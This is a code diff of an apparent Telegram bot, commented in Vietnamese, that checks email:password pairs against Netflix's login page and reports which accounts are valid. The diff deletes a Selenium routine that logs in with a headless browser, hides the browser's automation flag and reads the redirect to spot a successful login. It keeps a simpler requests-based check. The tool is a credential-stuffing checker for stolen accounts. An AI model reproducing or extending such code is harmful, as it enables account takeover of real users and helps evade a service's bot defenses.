@@ -4,11 +4,6 @@ import time
 import logging
 import asyncio
 import requests
-from selenium import webdriver
-from selenium.webdriver.common.by import By
-from selenium.webdriver.support.ui import WebDriverWait
-from selenium.webdriver.support import expected_conditions as EC
-from selenium.webdriver.chrome.options import Options
 from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
@@ -91,83 +86,17 @@ def check_with_requests(email: str, password: str) -> bool:
         logger.warning(f"[Requests] Lỗi: {e}")
         return False  # Fallback sang Selenium
 
-# ================== HÀM KIỂM TRA BẰNG SELENIUM ==================
-def check_with_selenium(email: str, password: str) -> bool:
-    """
-    Dùng Selenium mở trình duyệt, đăng nhập và kiểm tra.
-    Trả về True nếu thành công, False nếu sai thông tin.
-    """
-    chrome_options = Options()
-    chrome_options.add_argument("--headless")
-    chrome_options.add_argument("--no-sandbox")
-    chrome_options.add_argument("--disable-dev-shm-usage")
-    chrome_options.add_argument("--disable-gpu")
-    chrome_options.add_argument("--window-size=1920,1080")
-    chrome_options.add_argument(f"user-agent={USER_AGENT}")
-    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
-    chrome_options.add_experimental_option('useAutomationExtension', False)
-
-    # Khởi tạo driver – không dùng Service, chromedriver đã có trong PATH
-    driver = webdriver.Chrome(options=chrome_options)
-    driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
-
-    try:
-        logger.info(f"[Selenium] Đang kiểm tra {email}")
-        driver.get(NETFLIX_LOGIN_URL)
-        wait = WebDriverWait(driver, 10)
-
-        # Nhập email
-        email_input = wait.until(EC.presence_of_element_located((By.NAME, "userLoginId")))
-        email_input.clear()
-        email_input.send_keys(email)
-
-        # Nhập password
-        pass_input = driver.find_element(By.NAME, "password")
-        pass_input.clear()
-        pass_input.send_keys(password)
-
-        # Click nút đăng nhập
-        login_button = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
-        login_button.click()
-
-        # Đợi chuyển hướng (có thể lâu hơn nếu mạng chậm)
-        time.sleep(8)
-
-        # Kiểm tra URL hiện tại
-        current_url = driver.current_url
-        page_source = driver.page_source.lower()
-
-        if "browse" in current_url or "profiles" in current_url:
-            logger.info(f"[Selenium] Thành công: {email}")
-            return True
-        elif "incorrect password" in page_source or "không tìm thấy tài khoản" in page_source:
-            logger.info(f"[Selenium] Sai thông tin: {email}")
-            return False
-        else:
-            logger.warning(f"[Selenium] Không xác định được kết quả cho {email}")
-            return False
-    except Exception as e:
-        logger.error(f"[Selenium] Lỗi khi kiểm tra {email}: {e}")
-        return False
-    finally:
-        driver.quit()
-
 # ================== HÀM KIỂM TRA TỔNG HỢP ==================
 async def check_account(email: str, password: str) -> str:
     """
-    Kiểm tra một tài khoản: thử requests trước, nếu thất bại thì dùng Selenium.
+    Kiểm tra một tài khoản bằng requests.
     Trả về chuỗi kết quả.
     """
     logger.info(f"Đang kiểm tra: {email}")
-    # Thử requests
     if check_with_requests(email, password):
-        return f"✅ {email}:{password} | Hợp lệ (requests)"
+        return f"✅ {email}:{password} | Hợp lệ"
     else:
-        # Fallback Selenium
-        if check_with_selenium(email, password):
-            return f"✅ {email}:{password} | Hợp lệ (selenium)"
-        else:
-            return f"❌ {email}:{password} | Không hợp lệ"
+        return f"❌ {email}:{password} | Không hợp lệ"
 
 # ================== XỬ LÝ TELEGRAM BOT ==================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
